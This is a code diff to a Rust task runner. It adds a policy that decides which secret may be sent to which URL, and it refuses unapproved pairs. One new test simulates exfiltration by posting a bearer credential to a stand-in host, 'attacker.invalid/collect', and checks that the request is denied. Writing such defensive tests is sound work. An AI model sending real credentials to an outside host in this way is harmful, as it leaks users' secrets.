@@ -7,7 +7,8 @@
 //! exactly once.
 
 use kobo_protocol::{
-    SecretHeader, Task, TaskError, TaskId, TaskOutcome, MAX_TASK_BYTES, MAX_TASK_BYTES_U32,
+    Credential, SecretHeader, Task, TaskError, TaskId, TaskOutcome, MAX_TASK_BYTES,
+    MAX_TASK_BYTES_U32,
 };
 use std::collections::HashMap;
 use std::io::Read;
@@ -74,6 +75,12 @@ pub type Poster = dyn Fn(&str, &[u8], &str, Option<(&str, &str)>, &[(&str, &str)
     + Send
     + Sync;
 
+/// Decides whether one named credential may be sent to one URL.
+///
+/// Secret files alone are not authority: without this second decision an
+/// application could name a real key and an attacker-controlled destination.
+pub type CredentialAuthorizer = dyn Fn(&Credential, &str) -> bool + Send + Sync;
+
 /// Headers an application may not set, because the runtime decides them.
 ///
 /// `Authorization` is here even though a credential may legitimately go there:
@@ -123,6 +130,8 @@ pub struct TaskRunner {
     post: Option<Arc<Poster>>,
     /// Where named secrets are read from, if anywhere.
     secrets: Option<PathBuf>,
+    /// Which secret and destination pairs this application is trusted to use.
+    credentials: Option<Arc<CredentialAuthorizer>>,
     /// Called once, from the task's own thread, the moment a result is ready.
     ///
     /// A runtime that only looks for results when something else happens keeps
@@ -145,6 +154,7 @@ impl std::fmt::Debug for TaskRunner {
             // up in error messages and traces.
             .field("posts", &self.post.is_some())
             .field("secrets", &self.secrets.is_some())
+            .field("credential_policy", &self.credentials.is_some())
             .finish_non_exhaustive()
     }
 }
@@ -167,6 +177,7 @@ impl TaskRunner {
             fetch: None,
             post: None,
             secrets: None,
+            credentials: None,
             wake: None,
         }
     }
@@ -200,6 +211,16 @@ impl TaskRunner {
     #[must_use]
     pub fn with_secrets(mut self, directory: impl Into<PathBuf>) -> Self {
         self.secrets = Some(directory.into());
+        self
+    }
+
+    /// Supplies the application-specific credential destination policy.
+    ///
+    /// A runner without one may still perform unauthenticated requests, but
+    /// refuses every request naming a secret.
+    #[must_use]
+    pub fn with_credential_policy(mut self, policy: Arc<CredentialAuthorizer>) -> Self {
+        self.credentials = Some(policy);
         self
     }
 
@@ -263,6 +284,7 @@ impl TaskRunner {
         let fetch = self.fetch.clone();
         let post = self.post.clone();
         let secrets = self.secrets.clone();
+        let credentials = self.credentials.clone();
         let flag = Arc::clone(&cancel);
         let wake = self.wake.clone();
         let handle = thread::Builder::new()
@@ -275,6 +297,7 @@ impl TaskRunner {
                         fetch: fetch.as_deref(),
                         post: post.as_deref(),
                         secrets: secrets.as_deref(),
+                        credentials: credentials.as_deref(),
                     },
                     &flag,
                 );
@@ -370,6 +393,7 @@ struct Backends<'a> {
     fetch: Option<&'a Fetcher>,
     post: Option<&'a Poster>,
     secrets: Option<&'a Path>,
+    credentials: Option<&'a CredentialAuthorizer>,
 }
 
 /// Reads a named secret.
@@ -411,6 +435,7 @@ fn run(work: &Task, root: &Path, backends: Backends<'_>, cancel: &AtomicBool) ->
         fetch,
         post,
         secrets,
+        credentials,
     } = backends;
     match work {
         Task::Sleep { seconds } => {
@@ -485,6 +510,9 @@ fn run(work: &Task, root: &Path, backends: Backends<'_>, cancel: &AtomicBool) ->
             // instead of the real problem.
             let credential = match wanted {
                 None => None,
+                Some(wanted) if credentials.is_none_or(|allows| !allows(wanted, url)) => {
+                    return TaskOutcome::Failed(TaskError::Denied);
+                }
                 Some(wanted) => match secret(secrets, &wanted.secret) {
                     None => return TaskOutcome::Failed(TaskError::Denied),
                     // Assembled here, in the one place that has both the
@@ -837,6 +865,7 @@ mod tests {
         let mut runner = TaskRunner::simulated(temp_root("nosecret"))
             .with_capabilities([Capability::Network])
             .with_secrets(temp_root("nosecret-empty"))
+            .with_credential_policy(Arc::new(|_, _| true))
             .with_post(Arc::new(move |_, _, _, _, _, _| {
                 observed.store(true, Ordering::SeqCst);
                 Ok(Vec::new())
@@ -867,6 +896,9 @@ mod tests {
         let mut runner = TaskRunner::simulated(temp_root("resolved-root"))
             .with_capabilities([Capability::Network])
             .with_secrets(directory)
+            .with_credential_policy(Arc::new(|credential, url| {
+                credential.secret == "openai" && url == "https://example.invalid/"
+            }))
             .with_post(Arc::new(|_, _, _, credential, _, _| {
                 assert_eq!(credential, Some(("Authorization", "Bearer not-a-real-key")));
                 Ok(b"{\"ok\":true}".to_vec())
@@ -891,6 +923,41 @@ mod tests {
         let answer = String::from_utf8_lossy(bytes);
         assert_eq!(answer, "{\"ok\":true}");
         assert!(!answer.contains("not-a-real-key"));
+    }
+
+    #[test]
+    fn a_secret_cannot_be_sent_to_a_destination_its_policy_did_not_allow() {
+        let directory = secret_dir("wrong-destination");
+        let sent = Arc::new(AtomicBool::new(false));
+        let observed = Arc::clone(&sent);
+        let mut runner = TaskRunner::simulated(temp_root("wrong-destination-root"))
+            .with_capabilities([Capability::Network])
+            .with_secrets(directory)
+            .with_credential_policy(Arc::new(|credential, url| {
+                credential.secret == "openai" && url == "https://api.openai.com/v1/chat/completions"
+            }))
+            .with_post(Arc::new(move |_, _, _, _, _, _| {
+                observed.store(true, Ordering::SeqCst);
+                Ok(Vec::new())
+            }));
+        runner
+            .submit(
+                TaskId(1),
+                Task::Post {
+                    url: "https://attacker.invalid/collect".into(),
+                    body: "{}".into(),
+                    content_type: "application/json".into(),
+                    credential: Some(Credential::bearer("openai")),
+                    headers: Vec::new(),
+                    max_bytes: 1024,
+                },
+            )
+            .expect("submitted");
+        assert_eq!(
+            collect(&mut runner, 1)[0].outcome,
+            TaskOutcome::Failed(TaskError::Denied)
+        );
+        assert!(!sent.load(Ordering::SeqCst));
     }
 
     #[test]
